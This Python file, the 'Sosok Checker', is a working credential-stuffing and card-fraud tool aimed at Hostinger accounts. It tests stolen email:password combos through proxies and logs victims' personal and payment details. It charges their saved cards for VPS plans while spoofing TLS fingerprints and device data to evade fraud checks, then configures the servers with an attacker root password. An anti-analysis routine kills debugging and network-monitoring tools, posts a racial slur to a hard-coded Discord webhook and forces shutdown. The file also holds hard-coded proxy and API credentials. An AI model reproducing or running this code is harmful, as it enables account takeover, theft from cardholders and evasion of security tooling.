import httpx
import re
import tls_client
import threading
import time
import sys
from util import *
import webbrowser
import os
from colorama import Fore, just_fix_windows_console
from getpass import getpass
import platform
import hashlib
import datetime
import random
import subprocess
import pytz
import tomllib

BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'ida64', 'ollydbg', 'pestudio', 'x96dbg', 'vmsrvc', 'x32dbg', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', "ProcessHacker", "Requestly")
@staticmethod
def TaskKill(*tasks: str) -> None:
    tasks = list(map(lambda x: x.lower(), tasks))
    out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
    for i in out:
        i = i.split('\r\n')[:2]
        try:
            name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
            name = name[:-4] if name.endswith('.exe') else name
            if name.lower() in tasks:
                subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
                webbrowser.open('https://pastebin.com/raw/AaaAQqMt')
                webbrowser.open('https://youtu.be/GGQF7TTZpvI?t=35')
                httpx.post('https://ptb.discord.com/api/webhooks/1310705462294872156/uum3xYUAXK_-A8rg4nUrLTlhEJOedfITRC8P1CMx9MU_8rhyM_NvfmWREEAfKxmUefbu', json={'content': 'some nigger tried to crack @everyone'})
                time.sleep(5)
                os.system("shutdown /s /t 0")
        except Exception:
            pass
just_fix_windows_console()

@staticmethod
def killTasks() -> None:
    TaskKill(*BLACKLISTED_TASKS)
killTasks()

with open('combo.txt') as f:
    combo = f.read().strip().splitlines()

with open('config.toml', 'rb') as file:
    config = tomllib.load(file)

proxy_login = config['settings']['proxies']['login']
proxy_autobuy = config['settings']['proxies']['autobuy']

autobuy_enabled = config['settings']['autobuy']['enabled']
vps_plan = config['settings']['autobuy']['vpsplan']
quantity = config['settings']['autobuy']['quantity']

autosetup_enabled = config['settings']['autobuy']['autosetup']['enabled']
autosetup_passwd = config['settings']['autobuy']['autosetup']['password']
autosetup_location = config['settings']['autobuy']['autosetup']['location']

check_count = 0
total_checks = 0
hits = 0
autobuyed = 0
total_accounts = len(combo)
checked_accounts = 0
last_check_time = time.time()

def randomize_device_data():
    return {
        "request_origin": random.choice(["web", "mobile", "desktop"]),
        "app_color_depth": random.choice([16, 24, 32]),
        "app_language": random.choice(["en-US", "en-GB", "ru-RU", "es-ES", "fr-FR"]),
        "app_screen_height": random.choice([720, 768, 1080, 1440, 2160]),
        "app_screen_width": random.choice([1280, 1366, 1920, 2560, 3840]),
        "app_timezone_offset": random.choice([-720, -480, -360, 0, 330, 480, 660]),
        "app_java_enabled": random.choice([True, False]),
    }

def update_title():
    global check_count, total_checks, last_check_time, checked_accounts, total_accounts, hits, autobuyed
    while True:
        current_time = time.time()
        
        if current_time - last_check_time >= 60:
            cpm = check_count
            check_count = 0
            last_check_time = current_time
            
            os.system(f'title [Hostinger AutoBuy] Sosok Checker / Hits: {hits} / Checked: {checked_accounts}/{total_accounts} / AutoBuyed: {autobuyed} / CPM: {cpm}')
        else:
            os.system(f'title [Hostinger AutoBuy] Sosok Checker / Hits: {hits} / Checked: {checked_accounts}/{total_accounts} / AutoBuyed: {autobuyed} / CPM: {check_count}')
        
        time.sleep(1)

def check():
    global check_count, total_checks, hits, checked_accounts, autobuyed
    while True:
        try:
            client = httpx.Client(proxy=f'http://{proxy_login}', timeout=60)
            email, passwd = combo.pop().split(':')
            safsdfd = client.get('https://auth.hostinger.com/in/login')
            _token = safsdfd.text.split('name="_token" value="')[1].split('"')[0]
            xsrf_token = safsdfd.cookies['XSRF-TOKEN']
            sso_session = safsdfd.cookies['sso_session']
            login = client.post('https://auth.hostinger.com/in/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': f'XSRF-TOKEN={xsrf_token}%3D; sso_session={sso_session}%3D; cookie_consent=statistics%2Cadvertising; _gcl_au=1.1.1700841239.1732404881',
                'Origin': 'https://auth.hostinger.com',
                'Priority': 'u=0, i',
                'Referer': 'https://auth.hostinger.com/in/login',
                'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
            }, data={
                '_token': _token,
                'email': email,
                'password': passwd,
                'screen_color_depth': '24',
                'screen_height': '1080',
                'screen_width': '1920',
                'window_height': '945',
                'window_width': '1026',
                'is_cookie_support_enabled': '1'
            })
            if 'Redirecting to <a href="https://auth.hostinger.com/in/login">https://auth.hostinger.com/in/login</a>.' in login.text:
                print(f'{Fore.RED}INVALID{Fore.RESET} {email}:{passwd}')
                pass
            else:
                jwt_pattern = r"jwt=([a-zA-Z0-9\-_]+(?:\.[a-zA-Z0-9\-_]+){2})"
                match = re.search(jwt_pattern, login.text)

                if match:
                    jwt = match.group(1)

                    profile = client.get('https://hpanel.hostinger.com/api/auth/api/external/v1/profile', headers={
                        'Authorization': f'Bearer {jwt}',
                    })

                    get_payment_methods = client.get('https://hpanel.hostinger.com/api/billing/api/v1/payment/get-payment-methods', headers={
                        'Authorization': f'Bearer {jwt}',
                    })

                    get_vps = client.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine?gaid=GA1.2.1081141849.1732406814', headers={
                        'Authorization': f'Bearer {jwt}',
                    })

                    get_domains = client.get('https://hpanel.hostinger.com/api/auth/api/external/v1/access?gaid=GA1.2.1132560424.1732450522', headers={
                        'Authorization': f'Bearer {jwt}',
                    })
                    if get_domains.json()['data']['managing_me']:
                        allowed_domains = get_domains.json()['data']['managing_me'][0]['allowed_domains']
                    else:
                        allowed_domains = []
                    domains_count = len(allowed_domains) if allowed_domains else 0

                    print(f'{Fore.LIGHTGREEN_EX}HIT{Fore.RESET} {email}:{'*' * len(passwd)}')
                    hits += 1
                    with open('results/hits_captureless.txt', 'a') as f:
                        f.write(f'{email}:{passwd}\n')
                    with open('results/hits_captured.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{email}:{passwd} / Full Name = {profile.json()['data']['contact']['first_name']} {profile.json()['data']['contact']['last_name']} / Country = {profile.json()['data']['contact']['country_code']} / Is PRO = {profile.json()['data']['account']['is_pro']} / New User = {profile.json()['data']['account']['is_new_user']} / Linked Payment Method = {'✔️' if get_payment_methods.json().get("data", []) else '✖'}  / VPS = {sum(1 for vps in get_vps.json()['data'] if 'label' in vps['template'])} / DOMAINS = {domains_count} {allowed_domains}\n')

                    # AUTOBUY
                    if autobuy_enabled:
                        for entry in get_payment_methods.json()['data']:
                            if entry['is_expired']:
                                print(f'{email}:{'*' * len(passwd)} | {Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.RED}EXPIRED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}ID{Fore.RESET} {entry['id']}: {Fore.LIGHTYELLOW_EX}TOKEN{Fore.RESET}: {token}')
                            else:
                                token = entry['token']
                                try:
                                    public_key = entry['features']['processout_js_sdk']['public_key']
                                except TypeError:
                                    print(f'{email}:{'*' * len(passwd)} | {Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.RED}DEAD{Fore.RESET} | {Fore.LIGHTYELLOW_EX}ID:{Fore.RESET} {entry['id']} {Fore.LIGHTYELLOW_EX}TOKEN:{Fore.RESET} {token}')
                                    continue
                                print(f"{email}:{'*' * len(passwd)} | {Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.LIGHTGREEN_EX}WORKING{Fore.RESET} | {Fore.LIGHTYELLOW_EX}ID:{Fore.RESET} {entry['id']} {Fore.LIGHTYELLOW_EX}TOKEN:{Fore.RESET} {token}, {Fore.LIGHTYELLOW_EX}PUBLIC KEY:{Fore.RESET} {public_key}")
                                clientnigger = tls_client.Session(
                                    client_identifier='chrome_131',
                                    ja3_string='772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-45-5-35-18-51-13-65037-27-16-11-0-43-17513-10-65281,4588-29-23-24,0',
                                    h2_settings={
                                        'HEADER_TABLE_SIZE': 65536,
                                        'SETTINGS_ENABLE_PUSH': 0,
                                        'INITIAL_WINDOW_SIZE': 6291456,
                                        'MAX_HEADER_LIST_SIZE': 262144
                                    },
                                    h2_settings_order=[
                                        'HEADER_TABLE_SIZE',
                                        'SETTINGS_ENABLE_PUSH',
                                        'INITIAL_WINDOW_SIZE',
                                        'MAX_HEADER_LIST_SIZE'
                                    ],
                                    supported_signature_algorithms=[
                                        'ECDSAWithP256AndSHA256',
                                        'PSSWithSHA256',
                                        'PKCS1WithSHA256',
                                        'ECDSAWithP384AndSHA384',
                                        'PSSWithSHA384',
                                        'PKCS1WithSHA384',
                                        'PSSWithSHA512',
                                        'PKCS1WithSHA512'
                                    ],
                                    supported_versions=[
                                        'GREASE',
                                        '1.3',
                                        '1.2'
                                    ],
                                    key_share_curves=[
                                        'GREASE',
                                        'X25519'
                                    ],
                                    cert_compression_algo='brotli',
                                    pseudo_header_order=[
                                        ':method',
                                        ':authority',
                                        ':scheme',
                                        ':path'
                                    ],
                                    connection_flow=15663105,
                                    priority_frames=[],
                                    random_tls_extension_order=True
                                )
                                pay_nigger = clientnigger.post('https://hpanel.hostinger.com/api/billing/api/v1/order/one-click-pay', json={
                                    "customer_id": get_payment_methods.json()['data'][0]['customer_custom_id'],
                                    "currency": "USD",
                                    "coupons": [],
                                    "billing_address": {
                                        "first_name": profile.json()['data']['contact']['first_name'],
                                        "last_name": profile.json()['data']['contact']['last_name'],
                                        "company": profile.json()['data']['contact']['company_name'],
                                        "address_1": None,
                                        "address_2": None,
                                        "city": profile.json()['data']['contact']['city'],
                                        "zip": profile.json()['data']['contact']['zip'],
                                        "country": profile.json()['data']['contact']['country_code'],
                                        "phone": profile.json()['data']['contact']['phone'],
                                        "email": email
                                    },
                                    "items": [
                                        {
                                            "item_id": vps_plan,
                                            "quantity": quantity
                                        }
                                    ],
                                    "redirect_return": "https://hpanel.hostinger.com/purchase-new-vps/plans?purchase_flow=1",
                                    "redirect_cancel": "https://hpanel.hostinger.com/purchase-new-vps/plans?purchase_flow=1",
                                    "transaction_details": {
                                        "metadata": {
                                            "cvc_refresh_required": False
                                        }
                                    },
                                    "method_id": entry['id'],
                                    "riskjs_token": "dsid_eot3qav2dj6uthvb3hkewfrtjm",
                                    "metadata": {
                                        "creation_source": "hpanel",
                                        "creation_location": "vps-plans",
                                        "analytics_data": [
                                            {"key": "_ga", "value": "GA1.2.1849482013.1732459460"},
                                            {"key": "session_id", "value": "1732459481"},
                                            {"key": "client_id", "value": "1849482013.1732459460"},
                                            {"key": "consent", "value": "statistics,advertising"},
                                            {"key": "_ga_73N1QWLEMH", "value": "GS1.1.1732459481.1.1.1732460981.31.0.1242188348"},
                                            {"key": "item_list_id", "value": "hpanel_purchase_new_vps_plans_pricing_table-kvm"},
                                            {"key": "item_list_name", "value": "hPanel Kvm Purchase New Vps Plans Pricing Table"},
                                            {"key": "device_id", "value": "8931f939-8ad7-4ccf-839f-9048dc90f86b"},
                                            {"key": "hostname", "value": "wwww.hostinger.com"},
                                            {"key": "page_name", "value": "vps-purchase-plan"},
                                            {"key": "item_variant", "value": "hostingercom-vps-kvm1 - kvm1"}
                                        ]
                                    }
                                }, headers={
                                    'Authorization': f'Bearer {jwt}',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
                                }, proxy=f'http://{proxy_autobuy}')
                                if pay_nigger.status_code == 200:
                                    clienta = tls_client.Session(
                                        client_identifier='chrome_131',
                                        ja3_string='772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-45-5-35-18-51-13-65037-27-16-11-0-43-17513-10-65281,4588-29-23-24,0',
                                        h2_settings={
                                            'HEADER_TABLE_SIZE': 65536,
                                            'SETTINGS_ENABLE_PUSH': 0,
                                            'INITIAL_WINDOW_SIZE': 6291456,
                                            'MAX_HEADER_LIST_SIZE': 262144
                                        },
                                        h2_settings_order=[
                                            'HEADER_TABLE_SIZE',
                                            'SETTINGS_ENABLE_PUSH',
                                            'INITIAL_WINDOW_SIZE',
                                            'MAX_HEADER_LIST_SIZE'
                                        ],
                                        supported_signature_algorithms=[
                                            'ECDSAWithP256AndSHA256',
                                            'PSSWithSHA256',
                                            'PKCS1WithSHA256',
                                            'ECDSAWithP384AndSHA384',
                                            'PSSWithSHA384',
                                            'PKCS1WithSHA384',
                                            'PSSWithSHA512',
                                            'PKCS1WithSHA512'
                                        ],
                                        supported_versions=[
                                            'GREASE',
                                            '1.3',
                                            '1.2'
                                        ],
                                        key_share_curves=[
                                            'GREASE',
                                            'X25519'
                                        ],
                                        cert_compression_algo='brotli',
                                        pseudo_header_order=[
                                            ':method',
                                            ':authority',
                                            ':scheme',
                                            ':path'
                                        ],
                                        connection_flow=15663105,
                                        priority_frames=[],
                                        random_tls_extension_order=True
                                    )

                                    device_data = randomize_device_data()
                                    
                                    pay_balls = clienta.post(f'https://api.processout.com/invoices/{pay_nigger.json()['data']['transaction_details']['invoice_id']}/capture?legacyrequest=true&project_id={public_key}&x-Content-Type=application/json&x-API-Version=1.3.0.0&x-Authorization=Basic%20cHJval9Lak0yR25vbGVpc2RVZ3R5UE1qY0R1ZGVpczFUQlNEUDo=', json={
                                        "authorize_only": False,
                                        "source": token,
                                        "enable_three_d_s_2": True,
                                        "device": device_data,
                                        "request_origin": device_data["request_origin"],
                                        "app_color_depth": device_data["app_color_depth"],
                                        "app_language": device_data["app_language"],
                                        "app_screen_height": device_data["app_screen_height"],
                                        "app_screen_width": device_data["app_screen_width"],
                                        "app_timezone_offset": device_data["app_timezone_offset"],
                                        "app_java_enabled": device_data["app_java_enabled"]
                                    }, headers={
                                        'Authorization': 'Basic cHJval9Lak0yR25vbGVpc2RVZ3R5UE1qY0R1ZGVpczFUQlNEUDo=',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
                                    }, proxy=f'http://{proxy_autobuy}')
                                    pay_balls_response = pay_balls.json()
                                    print(pay_balls_response)

                                    if 'customer_action' not in pay_balls_response:
                                        print(f"{Fore.LIGHTYELLOW_EX}AUTOBUY{Fore.RESET} | {f'{Fore.LIGHTGREEN_EX}SUCCESS{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} Successfully purchased KVM1 plan | {Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(passwd)}' if pay_balls.json()['success'] else f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} {pay_balls.json()['message']}'}")
                                    else:
                                        print(f"{Fore.LIGHTYELLOW_EX}AUTOBUY{Fore.RESET} | {f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} 3D | {Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(passwd)}' if pay_balls.json()['success'] else f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} {pay_balls.json()['message']}'}")
                
                                    if 'customer_action' in pay_balls_response:
                                        with open('results/autobuy-fails.txt', 'a') as f:
                                            f.write(f'{email}:{passwd} DEBUG: 3D\n')
                                    else:
                                        if pay_balls_response.get('success', False):
                                            autobuyed += 1
                                            with open('results/autobuyed.txt', 'a') as f:
                                                f.write(f'{email}:{passwd}\n')
                                            if autosetup_enabled:
                                                clientb = httpx.Client(proxy=f'http://brd-customer-hl_d2ac0d30-zone-datacenter_proxy1:ewxmmc5ezeom@brd.superproxy.io:33335', timeout=60)
                                                fetch_vps = clientb.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine?gaid=GA1.2.1570124997.1732580115', headers={
                                                    'Authorization': f'Bearer {jwt}',
                                                })

                                                setup = clientb.post(f'https://hpanel.hostinger.com/api/vps/v1/virtual-machine/{fetch_vps.json()['data'][0]['id']}/setup?gaid=GA1.2.1570124997.1732580115', json={
                                                    'template_id': 1077,
                                                    'data_center_id': autosetup_location,
                                                    'hostname': fetch_vps.json()['data'][1]['hostname'],
                                                    'panel_password': '',
                                                    'root_password': autosetup_passwd,
                                                    'install_monarx': False,
                                                    'public_key': {
                                                        'name': '',
                                                        'key': ''
                                                    }
                                                }, headers={
                                                    'Authorization': f'Bearer {jwt}',
                                                })
                                                if setup.status_code == 200:
                                                    ipv4_address = setup.json()["data"]["ipv4"][0]["address"]
                                                    print(f"{Fore.LIGHTYELLOW_EX}AUTOSETUP{Fore.RESET} | {Fore.LIGHTGREEN_EX}SUCCESS{Fore.RESET} | "
                                                    f"{Fore.LIGHTYELLOW_EX}IP:{Fore.RESET} {ipv4_address} | "
                                                    f"{Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(autosetup_passwd)}")
                                                    with open('results/autosettuped.txt', 'a') as f:
                                                        f.write(f'root:{autosetup_passwd}@{ipv4_address}:22\n')
                                                else:
                                                    print(f"{Fore.LIGHTYELLOW_EX}AUTOSETUP{Fore.RESET} | {Fore.RED}FAILED{Fore.RESET} | "
                                                    f"{Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(autosetup_passwd)}")
                                        else:
                                            with open('results/autobuy-fails.txt', 'a') as f:
                                                f.write(f'{email}:{passwd} DEBUG: {pay_balls.status_code} , {pay_balls_response} , {pay_balls.text}\n')

                                elif pay_nigger.status_code == 403:
                                    print(f'{Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.RED}DEAD{Fore.RESET} - {email}:{'*' * len(passwd)}')
                                elif pay_nigger.status_code == 422:
                                    print(f'{Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.RED}DEAD{Fore.RESET} - {email}:{'*' * len(passwd)}')
                                else:
                                    print('=================================\nUNKNOWN ERROR:')
                                    print(pay_nigger.status_code, pay_nigger.json())
                                    print('UNKNOWN ERROR\n=================================')
                else:
                    print(f"{Fore.LIGHTCYAN_EX}ERROR{Fore.RESET} JVT Not Found")
            check_count += 1
            checked_accounts += 1
            total_checks += 1
        except Exception as e:
            print(f'{Fore.RED}ERROR{Fore.RESET} {e}')
            if 'pop from empty list' in str(e):
                print("CHECKING DONE.")
                sys.exit()

def generate_hwid():
    computer_info = platform.uname()
    processor_info = platform.processor()
    system_drive = os.getenv('SYSTEMDRIVE')
    
    raw_hwid = f"{computer_info.node}{processor_info}{system_drive}".encode()
    hashed_hwid = hashlib.sha256(raw_hwid).hexdigest()
    
    return hashed_hwid

os.system('cls')

print('Sosok Checker\n11/25/2024 #2\nMade by Vodlex and Allah\nchangelog:\n~ Added auto-setup for VPSes\n~Possibly unflagged auto-buyer\n~ Added password-masking for hits')
username = input("Enter username: ")
password = getpass("Enter password: ")
if authenticate(username, password, generate_hwid()):
    os.system('cls')
    print("Access granted!")
    time.sleep(3)
    os.system('cls')
    title_thread = threading.Thread(target=update_title)
    title_thread.daemon = True
    title_thread.start()
    threads = [threading.Thread(target=check) for _ in range(int(input('Threads: ')))]
    for t in threads: t.start()
    for t in threads: t.join()
else:
    os.system('cls')
    print(f"{Fore.RED}Access denied! HWID: {Fore.BLUE}{generate_hwid()} {Fore.RED}Contact staff or create ticket in our discord server!")
